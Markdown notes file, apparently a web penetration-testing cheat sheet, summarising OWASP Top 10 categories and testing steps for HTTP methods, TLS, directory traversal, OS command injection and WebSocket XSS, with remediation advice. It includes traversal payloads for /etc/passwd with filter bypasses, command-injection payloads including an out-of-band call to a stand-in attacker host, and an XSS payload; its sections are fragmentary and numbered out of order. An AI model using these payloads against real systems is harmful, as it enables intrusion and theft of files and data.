<td colspan="2"><b><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control">A01:2021-Broken Access Control:</a></b> 

- Violation of the principle of least privilege or deny by default, where access should only be granted for particular capabilities, roles, or users, but is available to anyone.
      
- Bypassing access control checks by modifying the URL (parameter tampering or force browsing), internal application state, or the HTML page, or by using an attack tool modifying API requests.
      
- Permitting viewing or editing someone else's account, by providing its unique identifier (insecure direct object references-IDOR)
      
- Accessing API with missing access controls for POST, PUT and DELETE.
      
- Acting as a user without being logged in or acting as an admin when logged in as a user.
      
- Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token, or a cookie or hidden field manipulated to elevate privileges or abusing JWT invalidation.
      
- CORS misconfiguration allows API access from unauthorized/untrusted origins.
      
- Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.
      
- <b>A5:2017 Broken Access Control:</b> Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality or data, such as access other users' accounts, view sensitive files, modify other users‚Äô data, change access rights, etc.

<td colspan="2"><b><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures">A02:2021-Cryptographic Failures:</a></b> 

- Is any data transmitted in clear text? This concerns protocols such as HTTP, SMTP, FTP also using TLS upgrades like STARTTLS. External internet traffic is hazardous. Verify all internal traffic, e.g., between load balancers, web servers, or back-end systems.

- Are any old or weak cryptographic algorithms or protocols used either by default or in older code?

- Are default crypto keys in use, weak crypto keys generated or re-used, or is proper key management or rotation missing? Are crypto keys checked into source code repositories?

- Is encryption not enforced, e.g., are any HTTP headers (browser) security directives or headers missing?

- Is the received server certificate and the trust chain properly validated?

- Are passwords being used as cryptographic keys in absence of a password base key derivation function?

- Is randomness used for cryptographic purposes that was not designed to meet cryptographic requirements? Even if the correct function is chosen, does it need to be seeded by the developer, and if not, has the developer over-written the strong seeding functionality built into it with a seed that lacks sufficient entropy/unpredictability?

- Are deprecated hash functions such as MD5 or SHA1 in use, or are non-cryptographic hash functions used when cryptographic hash functions are needed?

- Are deprecated cryptographic padding methods such as PCKS number 1 v1.5 in use?

- Are cryptographic error messages or side channel information exploitable, for example in the form of padding oracle attacks?
      
- <b>A3:2017 Sensitive Data Exposure:</b> Many web applications and APIs do not properly protect sensitive data, such as financial and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser.

There is a difference between insecure design and insecure implementation. We differentiate between design flaws and implementation defects for a reason, they have different root causes and remediation. A secure design can still have implementation defects leading to vulnerabilities that may be exploited. An insecure design cannot be fixed by a perfect implementation as by definition, needed security controls were never created to defend against specific attacks. One of the factors that contribute to insecure design is the lack of business risk profiling inherent in the software or system being developed, and thus the failure to determine what level of security design is required.</td>

- Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).
      
- Default accounts and their passwords are still enabled and unchanged.
      
- Error handling reveals stack traces or other overly informative error messages to users.
      
- For upgraded systems, the latest security features are disabled or not configured securely.
      
- The security settings in the application servers, application frameworks (e.g., Struts, Spring, ASP.NET), libraries, databases, etc., are not set to secure values.

## Strategies for VAPT      -> [PTES-Penetration Testing Execution Standard](https://pentest-standard.readthedocs.io/en/latest/index.html)
1. Reconnaissance (Foot Printing):- Information gathering
2. Network Scanning:- Find open ports and service running on the open ports
3. Exploitation:- Gaining system access
4. Maintaining Access:- Keep system access after leaving the system access
5. Clearing Logs:- Remove footprints


## Vulnerability Assessment & Penetration Testing is Divided into 2 Phase

### Phase 1 - Passive mode:
  Tries to understand the application‚Äôs logic and plays with the application. Tools can be used for information gathering. For example, an HTTP proxy can be used to observe all the HTTP requests and responses.
  
### Phase 2 - Active mode:
  Active tests have been split into 11 sub-categories.
1. Information Gathering
2. Configuration and Deployment Management Testing
3. Identity Management Testing 
4. Authentication Testing (Authentication is the process of verifying users identity by assuring that the person is the same as what he is claiming for) 
5. Authorization Testing (Authorization is the process of verifying what they have access to. It means it a way to check if the user has permission to use a resource or not)
6. Session Management Testing 
7. Input validation Testing
8. Error Handling
9. Cryptography
10. Business Logic Testing
11. Client Side Testing
12. API Testing

## 1. Information Gathering

## 2. Configuration and Deployment Management Testing
2.1 Test Network/Infrastructure Configuration

2.2 Test Application Platform Configuration

2.3 Test File Extensions Handling for Sensitive Information

2.4 Backup and Unreferenced Files for Sensitive Information

2.5 Enumerate Infrastructure and Application Admin Interfaces

**2.6 Test HTTP Methods:** (HEAD, GET, POST, PUT, DELETE, TRACE, OPTIONS, CONNECT)
  
  | GET  | POST |
| ------------- | ------------- |
| GET method is used to only retrieve data from the server using a given URL  | POST request is used to send data to the server  |
| e.g:    https://website.com/form.php?name=1&mob=2&add=3  | e.g:    https://website.com/form.php HTTP/1.1 <br /><br />name=1&mob=2&add=3 |
| Data in URL so anyone can see, bookmark, copy or change data  | URL+Request body in HTTP header which is hidden so if URL know but request boady dont know so no one can read, write, data  |
| 2048 character maximum length of URL  | Unlimited data length because data in request body  |
|  Only ASCII(e.g.convert **'** in %27 and **"** in %22) character can be sent | ASCII, Decimal, Binary all type of data can be sent  |

***- HEAD:*** Request used to get only response status and headers information from the server but no body(entity).
      
***- TRACE:*** Performs a message loop-back test along the path to the target resource.
      
***- OPTIONS:*** Method is used to describe the communication options for the target resource.
      
***- CONNECT:*** Method is used by the client to establish a network connection to a web server over HTTP
  
**2.7 Test HTTP Strict Transport Security:** HSTS header is a mechanism that web sites have to communicate to the web browsers that all traffic exchanged with a given domain must always be sent over HTTPS.
  
  HSTS header uses two directives:
  - max-age: Indicate the number of seconds that the browser should automatically convert all HTTP requests to HTTPS.
  - includeSubDomains: Indicate that all web application‚Äôs subdomains must use HTTPS.

  `` Strict-Transport-Security: max-age=60000; includeSubDomains ``  


**2.8 Test RIA cross domain policy:** Rich Internet Applications (RIA) have adopted Adobe‚Äôs crossdomain.xml policy files to allow for controlled cross domain access to data and service consumption using technologies such as Oracle Java, Silverlight, and Adobe Flash. Therefore, a domain can grant remote access to its services from a different domain. (Most RIA applications support crossdomain.xml and Silverlight used clientaccesspolicy.xml) [Testing Example: http://website.com/crossdomain.xml] 
```
<cross-domain-policy>
<allow-access-from domain=‚Äù*‚Äù />           //(If "*" indicate weak settings in the policies)
</cross-domain-policy>
```

## 5. Authorization Testing 

**5.1 Testing Directory traversal/file include**
  
  Directory traversal (a.k. file path traversal) is a vulnerability that allows an attacker to read arbitrary files on the server that is running an application. e.x: back-end systems file, application code & data, credentials and sensitive operating system files.
   
  Unix: `../`(../../etc/passwd) and Windows: both `../ and ..\` (..\..\windows\win.ini) are valid directory traversal sequences.
  
  If an application blocks directory traversal sequences then bypass using a variety of techniques:
   - Absolute path from the filesystem root: `name=/etc/passwd`
   - Nested traversal sequences: `....// or ....\/`
   - non-standard encodings: `..%c0%af or ..%252f`
   - If application requires user-supplied name must start with the expected base folder: `name=/var/www/images/../../../etc/passwd`
   - If application requires user-supplied name must end with an expected file extension, such as .png: `name=../../../etc/passwd%00.png`
   
  Remediation:
   1. most effective way to prevent file path traversal is to avoid **passing user-supplied input to filesystem**.
  
   2. If it is considered unavoidable to pass user-supplied input:
  
   - Validate the user input before processing it. Ideally, the validation should compare against a whitelist of permitted values.
  
   - Application should append the input to the base directory and use a platform filesystem API to canonicalize the path

7.18 Testing for Code Injection

7.19 Testing for Local File Inclusion

7.20 Testing for Remote File Inclusion

**7.21 Testing for OS Command Injection**
OS command injection (a.k. shell injection) is vulnerability that allows an attacker to execute arbitrary OS commands on the server that is running an application, and typically fully compromise the application and all its data.
  
When you have identified an OS command injection vulnerability execute some initial commands to obtain information about the system that you have compromised.
  Commands:
```
Purpose of command        Linux         Windows
Name of current user      whoami        whoami         ---> i.e `&whoami` or `|whoami`
Operating system          uname -a      ver
Network configuration     ifconfig      ipconfig /all
Network connections       netstat -an   netstat -an
Running processes         ps -ef        tasklist 
```
> Detecting blind OS command injection using time delays: `& ping -c 10 127.0.0.1 &`
> Exploiting blind OS command injection by redirecting output: `& whoami > /var/www/static/whoami.txt &`
> Exploiting blind OS command injection using out-of-band (OAST) techniques: `& nslookup name.webattacker.com &`
 
- Command separators work on both Windows and Unix-based systems: `&` `&&` `|` `||`
- Work only on Unix-based systems: `;` `Newline (0x0a or \n)`

  Prevention:
  - Never call out to OS commands from application-layer code.
  - Validating against a whitelist of permitted values.
  - Validating that the input is a number.
  - Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
  - Don't sanitize input by escaping shell metacharacters

7.28 [**Server-side template injection**](https://portswigger.net/web-security/server-side-template-injection)
  
  An attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side

  Vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.
      
## 8. Error Handling

**8.1 Analysis of Error Codes**
 - Web Server Errors: A common error that we can see during testing is the HTTP 404 Not Found.
  ![image](https://user-images.githubusercontent.com/65315090/128235946-c405fb72-d3cd-495e-ba89-8b563fb9a3fc.png)
 - Application Server Error: Application errors are returned by the application itself, rather than the web server. These could be error messages from framework code (ASP, JSP etc.) Detailed application errors typically provide information of server paths, installed libraries and application versions.
 - Database Error: Database errors are those returned by the Database System when there is a problem with the query or the connection
     80004005:- is a generic IIS error code which indicates that it could not establish a connection to its associated database
- ***Tools:*** ErrorMint

**8.2 Analysis of Stack Traces**
 - Stack traces are not vulnerabilities by themselves, but they often reveal information that is interesting to an attacker. 
 - Attackers attempt to generate these stack traces by tampering with the input to the web application with malformed HTTP requests and other input data.
 - Some tests to try include:
    -	Invalid input (such as input that is not consistent with application logic.
    -	Input that contains non alphanumeric characters or query syntax.
    -	Empty inputs.
    -	Inputs that are too long.
    -	Access to internal pages without authentication.
    -	Bypassing application flow.


## 9. Cryptography

**9.1 Testing for Weak SSL/TSL Ciphers, Insufficient Transport Layer Protection**
  - When the SSL/TLS service is present it is good but it following vulnerabilities exist:
    - SSL/TLS protocols, Ciphers, keys and renegotiation must be properly configured.
    - Certificate validity must be ensured:Testing SSL certificate validity ‚Äì client and server (manually)

  - Tools:
    - sslscan: ```$ sslscan www.microsoft.com```
    - openssl: ```$ openssl s_client ‚Äìconnect www.facebook.com:443 ‚Äìshowcert```
    - sslyze ( TLS/SSL Implementation Analyzer): ```$ sslyze--regular www.microsoft.com```
    - testssl.sh: ```$ testssl.sh ‚Äìt smtp smtp.gmail.com:25```
    - Nmap: ```$ nmap --script ssl-enum-ciphers -p 443 microsoft.com   ||  $ nmap -p 443 --script ssl-css-injection microsoft.com```
    - SSL-heartbleed: ```$ nmap -p 433 --script ssl-heartbleed microsoft.com```
    - SSL-Poodle: ```$ nmap -sV --version-light --script ssl-poodle -p 443 microsoft.com```
  - Online SSL scan:

**9.2 Testing for Padding Oracle**
  - A padding oracle is a function of an application which decrypts encrypted data provided by the client, e.g. internal session state stored on the client, and leaks the state of the validity of the padding after decryption. 
  - The existence of a padding oracle allows an attacker to decrypt encrypted data and encrypt arbitrary data without knowledge of the key used for these cryptographic operations. 
  - This can lead to leakage of sensible data or to privilege escalation vulnerabilities, if integrity of the encrypted data is assumed by the application.

**9.3 Testing for Sensitive information sent via unencrypted channels**
  - As a rule of thumb if data must be protected when it is stored,this data must also be protected during transmission. 
  - Some examples for sensitive data are:
    - Information used in authentication (e.g. Credentials, PINs, Session identifiers, Tokens, Cookies‚Ä¶)
    - Information protected by laws, regulations or specific organizational policy (e.g. Credit Cards, Customers data)
  - If the application transmits sensitive information via unencrypted channels (e.g. HTTP) it is considered a security risk. Ex. are:
    - Basic authentication which sends authentication credentials in plain-text over HTTP
    - Form based authentication credentials sent via HTTP
    - Cookie Containing Session ID Sent over HTTP

**11.10 Testing WebSockets**
  
   WebSockets used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.
  
   WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information

  - Example, Chat application uses WebSockets to send messages between the browser and the server. When a user types a message, a WebSocket message like the following is sent to the server: `{"message":"Hello Nayan"} `
  
    The contents of the message are transmitted via WebSockets to another chat user, and rendered in the user's browser as follows: `<P>Hello Nayan</P> `
  
    In this situation, no other input processing or defenses are in play, an attacker can perform a XSS attack by submitting the following WebSocket message: `{"message":"<img src=1 onerror='alert(1)'>"} `
  
  Remediation:
  - Use the wss:// protocol (WebSockets over TLS).
  - Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
  - Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
